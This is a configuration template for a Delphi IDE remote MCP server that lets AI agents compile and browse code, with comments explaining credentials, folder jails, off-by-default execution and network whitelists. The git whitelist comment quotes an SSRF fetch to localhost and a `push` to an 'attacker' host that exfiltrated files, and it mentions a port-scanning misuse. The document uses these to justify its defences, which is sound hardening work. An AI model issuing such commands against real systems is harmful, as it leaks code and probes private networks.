; ============================================================================
; Delphi IDE Remote MCP Server - configuration template
; ============================================================================
; Copy this file as "settings.ini" NEXT TO DelphiLspMcp.exe and edit.
; Every key is optional. Where noted, an environment variable takes
; precedence over the ini. Save the file WITHOUT a BOM.
;
; THE MODEL, in four layers (each section below belongs to one of them):
;
;   1. THE DOOR (credentials)  - who gets in at all, and with which scope:
;      the operator's global pair ([Security] AuthToken / ReadOnlyToken),
;      or a per-sandbox token ([Workspace.<name>] sections).
;   2. THE JAIL (roots)        - where a credential may touch disk. The
;      global roots ([Workspace] Roots) for the operator's tokens; each
;      [Workspace.<name>] carries its own smaller jail.
;   3. CAPABILITIES (opt-ins)  - what the server may DO beyond compiling:
;      run binaries, run tests, deploy-and-run remotely, reach git hosts.
;      All OFF by default; each is an explicit operator decision.
;   4. SURFACE ([Tools])       - what tools/list ADVERTISES. Cosmetic for
;      small models; never a permission.
;
; Defaults are safe: no credentials = localhost-only bind; execution OFF;
; explicit URLs refused. You opt IN to everything else.

; ----------------------------------------------------------------------------
[Server]
; ----------------------------------------------------------------------------
; HTTP listen port for --http mode and the tray app (-gui). Default: 3000.
; A port on the command line (DelphiLspMcp --http 3900) overrides this.
Port=3000

; Listen on ONE interface only (e.g. your LAN/VPN address). Empty = all
; interfaces - EXCEPT when no credential of any kind is configured, in which
; case the server binds to 127.0.0.1 on its own (fail safe).
; Env var DELPHI_MCP_BIND_IP takes precedence.
; BindIP=192.168.1.50

; ----------------------------------------------------------------------------
[Workspace]
; ----------------------------------------------------------------------------
; THE GLOBAL JAIL. Semicolon-separated roots; quotes around a path with
; spaces are tolerated. They are BOTH discovery (delphi_projects) and a jail:
; every disk-touching tool refuses paths outside them. This is the world the
; OPERATOR credentials ([Security] tokens) see; scoped tokens get their own
; smaller world below. Fail closed: if Roots has text but nothing parses,
; nothing is allowed. Empty = unrestricted local mode.
; Env var DELPHI_MCP_ROOTS takes precedence.
Roots=

; ----------------------------------------------------------------------------
[Security]
; ----------------------------------------------------------------------------
; --- Credentials (layer 1) --------------------------------------------------

; The OPERATOR's token: full read-write over every root, every workspace
; included (Authorization: Bearer <token>). Empty = no auth: fine on
; localhost, do NOT expose to the network like that.
; Env var DELPHI_MCP_TOKEN takes precedence.
AuthToken=

; Optional second operator credential with READ-ONLY access everywhere:
; reading, searching, symbols, diagnostics, downloads and query git commands
; work; edit, create, build, run, package and git writes are refused. For
; reviewer agents. Env var DELPHI_MCP_READONLY_TOKEN takes precedence.
ReadOnlyToken=

; 1 = requests WITHOUT a token get read-only access instead of 401.
AnonymousReadOnly=0

; --- Execution opt-ins (layer 3) - all OFF: this is a compile server -------

; 1 = delphi_run may EXECUTE a compiled program ON THIS SERVER (low-integrity
; sandbox, timeout, output captured). Default 0: it compiles, it never runs.
; To test a binary, download it (delphi_package + delphi_fetch) and run it on
; the CLIENT, or deploy to a real target. Refused for every credential while
; 0. Env var DELPHI_MCP_ALLOW_RUN takes precedence.
AllowRun=0

; 1 = delphi_test command=run may BUILD and RUN a test project of the
; workspace here (console/DUnitX runner, sandboxed, timeout). SEPARATE from
; AllowRun on purpose: allowing a test suite is a narrower decision than
; allowing arbitrary binaries - and without it an agent can write code but
; never learn whether it works. AllowRun=1 implies this one. command=discover
; works regardless. Env var DELPHI_MCP_ALLOW_TESTS takes precedence.
AllowTests=0

; 1 = delphi_paserver command=remote-run may EXECUTE, on a PAServer target,
; the program THAT PROJECT deployed there (never anything else on that
; machine: the server derives the path, and the runner on the target refuses
; whatever falls outside the project's deploy folder or is not a native
; binary). INDEPENDENT of AllowRun: running on the target is not running
; here, and the operator of this server is not necessarily the owner of that
; machine. Two locks in series: this switch, and the runner someone has to
; launch on the target. Env var DELPHI_MCP_ALLOW_REMOTE_RUN takes precedence.
AllowRemoteRun=0

; 1 = delphi_build may compile a project whose .dproj declares custom MSBuild
; targets that RUN a program or write files (post-build steps, Authenticode
; signing). Default 0: a build is otherwise a compile, and a hostile .dproj
; would be arbitrary execution. A trusted project can sign on build without
; enabling delphi_run (AllowRun=1 implies this one).
; Env var DELPHI_MCP_ALLOW_BUILD_SCRIPTS takes precedence.
AllowBuildScripts=0

; --- Network whitelists (layer 3) ------------------------------------------

; Host NAMES delphi_git may reach when an agent writes an EXPLICIT url
; (clone/fetch/pull/push), comma-separated. Empty - the default - refuses
; every explicit URL. Measured reason: `fetch http://127.0.0.1:3131/...` made
; the SERVER open that connection (SSRF), and `push https://attacker/...`
; walked the jail's contents out. The remotes YOU configured in a repository
; keep working by name (push origin main). Env var DELPHI_MCP_GIT_REMOTES
; takes precedence.
; GitRemotes=github.com,gitlab.example.com
GitRemotes=

; Host NAMES delphi_paserver may DIAL when the caller names one by hand
; (test-connection host=...), comma-separated. The hosts of the IDE's own
; connection profiles are always allowed, so the normal workflow
; (test-connection name=<profile>) works with this empty. Measured reason:
; without it, test-connection was a port scanner run from inside this
; machine's network. Env var DELPHI_MCP_REMOTE_HOSTS takes precedence.
RemoteHosts=

; Project NAMES (or full .dproj paths) remote-run may execute on a target,
; semicolon-separated, matched without extension, case-insensitive. Empty =
; any project of the roots (fine for a single-owner workspace); set it when
; projects of different trust share the server.
;   RemoteRunProjects=GalateaFMX;MiApp
RemoteRunProjects=

; --- Zones and subdivision (layer 2 refinements) ---------------------------

; 1 (default) = reading tools may ALSO enter the read-only LIBRARY ZONE
; (RTL/VCL/FMX sources, installed components, GetIt catalog, SDKs) besides
; the jail - that is what lets an agent check an API in the real source
; instead of guessing. Readable for every credential, writable for none.
; 0 = cut it: reads confined to the roots, exactly like writes.
; delphi_workspace lists the resolved folders. DELPHI_MCP_LIBRARY_ZONE=0 wins.
LibraryZone=1

; 1 = each identified agent may WRITE only inside its own subfolder
; <root>\<clientInfo.name>\... (reading the whole tree stays open). This is
; COOPERATIVE subdivision inside one credential's jail - the name is
; self-declared; for a boundary the agent cannot cross, use a
; [Workspace.<name>] token instead. Works inside token workspaces too.
; A caller with no identity (stdio / the operator) is never confined.
; Env var DELPHI_MCP_AGENT_CONFINEMENT takes precedence.
AgentConfinement=0

; Subfolder names any agent may write even under AgentConfinement (a common
; drop area), comma-separated. DELPHI_MCP_SHARED_FOLDERS takes precedence.
SharedFolders=

; ----------------------------------------------------------------------------
; [Workspace.<name>]  - token-scoped sandboxes (layers 1+2 in one section)
; ----------------------------------------------------------------------------
; THE SECRET DECIDES THE JAIL, not the self-declared agent name. Each
; [Workspace.<name>] section defines a sandbox: whoever presents its Token
; works read-write inside ITS Roots and nowhere else - other workspaces'
; roots are not even READABLE (hard boundary; the library zone above stays
; readable for everyone). The global AuthToken remains the operator: every
; root, unchanged.
;
; Workspaces may OVERLAP: one can hold a whole tree and another just a
; subfolder of it. Each token's jail is the union of its OWN roots - nothing
; is ever subtracted for belonging to another workspace too (the wide token
; still sees the subfolder; the narrow one never leaves it).
;
; A workspace whose Roots fail to parse admits NOBODY (fail closed), and a
; workspace token counts as a credential for the fail-safe bind decision.
;
; [Workspace.Galatea]
; Token=un-secreto-largo-para-este-espacio
; Roots=D:\SandBox-lsp\galatea;D:\SandBox-lsp\shared
; ReadOnlyToken=otro-secreto-solo-lectura   ; optional reviewer credential
; Profile=coder                             ; optional tools/list trim (see [Tools])
;
; [Workspace.Pruebas]
; Token=otro-secreto
; Roots=D:\SandBox-lsp\pruebas

; ----------------------------------------------------------------------------
[Tools]
; ----------------------------------------------------------------------------
; SURFACE, not security: trims what tools/list ADVERTISES. Hidden tools stay
; callable - permissions are the credentials and the jail above. Why: a small
; model reading 41 schemas (~15k tokens) drowns before working. delphi_help,
; delphi_messages and delphi_report are always listed. A [Workspace.<name>]
; Profile= overrides this global one for that token.
; Env var DELPHI_MCP_TOOLS_PROFILE takes precedence.
;   full   (default) every tool
;   coder  everything except the shipping trio (adb, paserver, package)
;   reader understand and navigate only: read/list/search/fetch, the LSP
;          seven, projects/installs/workspace, vault_read/vault_search
Profile=full

; Explicit allowlist (comma-separated tool names); overrides Profile.
; Env var DELPHI_MCP_TOOLS_ONLY takes precedence.
; Only=delphi_read,delphi_search,delphi_symbols

; ----------------------------------------------------------------------------
[Vault]
; ----------------------------------------------------------------------------
; OPTIONAL persistent MEMORY for your agents. Point this at a folder of
; Markdown notes (an Obsidian vault) and the server exposes vault_read /
; vault_search, so a remote agent can consult accumulated knowledge -
; decisions, conventions, project context - not just source code.
; Empty (default) = the vault_* tools are not registered at all.
; The vault carries its OWN rules: the agent bootstraps with vault_read (no
; path) -> AGENTS-VAULT.md (rules) + MEMORY.md (index). See docs/VAULT.md.
; Env var DELPHI_MCP_VAULT_PATH takes precedence.
; Path=D:\Vaults\AI-Memory

; 1 (default) = read-only: only vault_read / vault_search. 0 = also expose
; vault_append, vault_create and vault_patch. Writing is deliberately limited
; to appending, creating and anchored replacement - never wholesale rewrites
; or deletes - and the server ALWAYS copies the original to
; backups\mcp\<timestamp>\ first. The governance files are never writable.
; A read-only credential is refused regardless.
ReadOnly=1

; ----------------------------------------------------------------------------
[Adb]
; ----------------------------------------------------------------------------
; Android device serials delphi_adb may touch, comma-separated. Absent =
; unrestricted (single-developer machine); set it when the adb bridge sees
; devices an agent must not reach.
; AllowedDevices=192.168.1.163

; ----------------------------------------------------------------------------
[Log]
; ----------------------------------------------------------------------------
; Tray-mode persistent log: blocks of LinesPerFile lines, up to MaxFiles
; files, next to the exe under logs\.
; LinesPerFile=2000
; MaxFiles=10
